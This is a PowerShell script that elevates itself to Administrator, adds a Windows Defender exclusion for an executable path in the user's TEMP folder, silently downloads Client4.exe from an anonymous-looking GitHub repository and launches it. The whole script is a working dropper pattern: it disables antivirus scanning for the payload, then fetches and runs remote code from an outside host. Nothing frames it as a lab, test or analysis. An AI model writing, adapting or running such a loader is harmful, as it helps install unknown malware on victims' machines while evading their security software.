<# 
.SYNOPSIS
Auto-elevate to Administrator and execute protected download

.DESCRIPTION
This script:
1. Self-elevates to Administrator if needed
2. Maintains original user context for file paths
3. Adds Defender exclusion before download
4. Handles errors at each stage
#>

param(
    [string]$OriginalTemp = $env:TEMP  # Default to current user's TEMP
)

# Elevate to Administrator if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Elevating to Administrator..."
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -OriginalTemp '$env:TEMP'"
    Start-Process pwsh.exe -Verb RunAs -ArgumentList $elevatedCommand
    exit
}

$output = Join-Path -Path $OriginalTemp -ChildPath "cf2.exe"

# Ensure clean environment
if (Test-Path $output) {
    Remove-Item $output -Force
}

try {
    # Add Defender exclusion
    Add-MpPreference -ExclusionPath $output -ErrorAction Stop
    Write-Host "[+] Added Defender exclusion for: $output"
    
    # Verify exclusion
    $exclusions = (Get-MpPreference).ExclusionPath
    if ($exclusions -notcontains $output) {
        throw "Exclusion verification failed"
    }

    # Download file
    $ProgressPreference = 'SilentlyContinue' # Hide download progress
    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/Client4.exe' -OutFile $output -ErrorAction Stop
    
    # Verify download
    if (-NOT (Test-Path $output)) {
        throw "File download failed"
    }
    Write-Host "[+] File downloaded successfully: $output"

    # Execute file
    $process = Start-Process $output -PassThru -ErrorAction Stop
    Write-Host "[+] Process started with PID: $($process.Id)"
}
catch {
    Write-Host "[!] Error: $_"
    Read-Host "Press Enter to exit"
    exit 1
}

# Optional: Cleanup exclusion after execution
# Remove-MpPreference -ExclusionPath $output

Read-Host "Operation completed. Press Enter to exit"
